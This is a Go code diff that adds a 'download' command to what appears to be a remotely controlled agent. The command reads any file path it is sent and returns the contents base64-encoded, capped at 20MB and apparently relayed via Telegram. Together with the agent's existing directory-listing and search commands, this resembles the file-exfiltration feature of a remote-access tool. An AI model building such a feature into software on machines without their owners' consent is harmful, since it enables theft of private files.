@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"path/filepath"
 	"runtime"
 	"time"
 
@@ -157,6 +158,29 @@ func handleCommand(c *client.Client, cmd client.Command) {
 		_ = json.Unmarshal([]byte(cmd.Payload), &payload)
 		listing := system.ListDir(payload.Path)
 		result = listing
+
+	case "download":
+		var payload struct {
+			Path string `json:"path"`
+		}
+		_ = json.Unmarshal([]byte(cmd.Payload), &payload)
+		data, err := system.DownloadFile(payload.Path)
+		if err != nil {
+			result = map[string]string{"error": err.Error()}
+			status = "failed"
+		} else {
+			// json.Marshal automatically encodes []byte as base64 string
+			// We limit to max 20MB for memory safety in JSON polling
+			if len(data) > 20*1024*1024 {
+				result = map[string]string{"error": "file too large (max 20MB via Telegram)"}
+				status = "failed"
+			} else {
+				result = map[string]interface{}{
+					"filename": filepath.Base(payload.Path),
+					"data":     data,
+				}
+			}
+		}
 
 	case "search":
 		var payload struct {
